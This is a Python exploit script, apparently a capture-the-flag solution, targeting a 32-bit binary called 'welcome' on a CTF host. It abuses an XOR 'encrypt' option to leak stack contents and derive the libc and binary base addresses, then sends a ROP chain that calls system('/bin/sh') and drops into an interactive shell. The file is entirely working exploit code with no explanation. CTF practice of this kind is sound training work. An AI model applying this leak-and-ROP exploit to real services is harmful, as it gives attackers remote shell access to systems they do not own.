#!/usr/bin/env python
from sc_expwn import *

bin_file = './welcome'
context(os = 'linux', arch = 'x86')
# context.log_level = 'debug'

#==========

env = Environment('debug', 'local', 'remote')
env.set_item('mode',    debug = 'DEBUG', local = 'PROC', remote = 'SOCKET')
env.set_item('target',  debug   = {'argv':[bin_file], 'aslr':False}, \
                        local   = {'argv':[bin_file]}, \
                        remote  = {'host':'welcome.ctf.site', 'port':23333})
env.set_item('libc',    debug   = None, \
                        local   = None, \
                        remote  = './libc-2.23.so')
env.select()

#==========

binf = ELF(bin_file)

libc = ELF(env.libc) if env.libc else binf.libc
offset_libc_stdout  = libc.symbols['_IO_2_1_stdout_']

#==========

def attack(conn):
    conn.recvuntil('Option: ')
    conn.sendline('1')
    conn.recvuntil('encrypt: ')
    conn.send('a'*0x100)

    conn.recvuntil('is: ')
    stack = xor(conn.recv(0x100), 0xde)
    
    libc.address = u(stack[4: 4+4]) - 0x47 - offset_libc_stdout
    info('addr_libc_base    = 0x{:08x}'.format(libc.address))
    addr_libc_system = libc.sep_function['system']
    addr_libc_strsh  = next(libc.search('/bin/sh'))

    binf.address = u(stack[0xb0: 0xb0+4]) - 0x95e
    # addr_binf_got   = binf.sep_section['.got']

    for i in range(0x70):
        if env.check('debug'):
            conn.recv()
        conn.sendline('4')

    rop = ROP(binf)
    rop.call(addr_libc_system, [addr_libc_strsh])

    '''
    if env.check('remote'):
        rop.raw(rop.ebx)
        rop.raw(addr_binf_got)
        rop.puts(libc.address + 0x184)
        rop.raw(libc.address + 0x3a819)
    else:
        rop.raw(rop.ebx)
        rop.raw(addr_binf_got)
        rop.puts(libc.address + 0x184)
    '''

    exploit  = str(rop)
    exploit += '\x00'*(0x100 - len(exploit))

    conn.recvuntil('Option: ')
    conn.sendline('1')
    conn.recvuntil('encrypt: ')
    conn.send(exploit)

#==========

if __name__=='__main__':
    conn = communicate(env.mode, **env.target)
    attack(conn)
    conn.interactive()
    
#==========
